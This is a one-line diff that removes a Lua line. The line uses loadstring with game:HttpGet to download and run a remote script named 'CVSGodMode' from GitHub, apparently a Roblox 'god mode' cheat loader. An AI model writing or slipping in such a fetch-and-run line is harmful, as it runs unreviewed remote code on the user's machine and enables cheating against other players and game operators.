@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IWillyLovePython/CVSGodMode/main/main.lua"))()
